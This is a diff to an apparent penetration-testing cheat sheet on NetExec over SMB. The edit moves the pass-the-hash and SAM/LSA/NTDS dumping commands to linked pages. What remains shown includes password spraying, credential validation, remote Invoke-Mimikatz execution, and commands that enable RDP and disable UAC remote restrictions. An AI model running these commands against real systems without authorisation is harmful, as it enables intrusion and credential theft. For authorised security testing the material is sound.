@@ -44,16 +44,14 @@ nxc smb $TARGET -u $USER -p $PASSWORD --groups
 ## Credential Testing
 
 ```bash
-# Test single username/password
+# Validate a single credential - (Pwn3d!) means the account is local admin
 nxc smb $TARGET -u $USER -p $PASSWORD
-
-# Test with NTLM hash (Pass-the-Hash)
-nxc smb $TARGET -u $USER -H $LM_HASH:$NT_HASH
-nxc smb $TARGET -u $USER -H $NT_HASH
 
 # Password spraying with lists
 nxc smb $TARGET -u users.txt -p passwords.txt --continue-on-success
 ```
+
+> Authenticating with an NT hash (`-H`) is [pass-the-hash](/active-directory/kerberos/pass-the-hash.md).
 
 ## Execution
 
@@ -73,28 +71,14 @@ nxc smb $TARGET -u $USER -p $PASSWORD -x 'powershell -nop -c "Invoke-Mimikatz"'
 
 ## 🛠️ Post-Exploitation
 
+Dumping secrets over SMB with nxc (`--sam`, `--lsa`, `--ntds`) is covered in
+[credential dumping](/active-directory/credential-dumping/).
+
 ```bash
-# Dump local SAM hashes
-nxc smb $TARGET -u $USER -p $PASSWORD --sam
-
-# Extract LSA secrets
-nxc smb $TARGET -u $USER -p $PASSWORD --lsa
-
-# Dump NTDS.dit (domain hashes)
-nxc smb $TARGET -u $USER -p $PASSWORD --ntds
-nxc smb $TARGET -u $USER -p $PASSWORD --ntds --use-vss
-
-# Enable RDP
-nxc smb $TARGET -u $USER -p $PASSWORD --enable-rdp
-
-# Disable UAC remote restrictions
-nxc smb $TARGET -u $USER -p $PASSWORD --disable-uac
+# Remote host configuration (requires admin on the target)
+nxc smb $TARGET -u $USER -p $PASSWORD --enable-rdp       # enable Remote Desktop
+nxc smb $TARGET -u $USER -p $PASSWORD --disable-uac      # disable UAC remote restrictions
 ```
-
-- `--lsa` : extract LSA secrets (including cached credentials and tokens)
-- `--ntds` : dump cached domain credentials from NTDS.dit (requires high privileges)
-- `--enable-rdp` : enable Remote Desktop (on the remote host)
-- `--disable-uac` : disable UAC remote restrictions
 
 ## 🧩 Modules
 
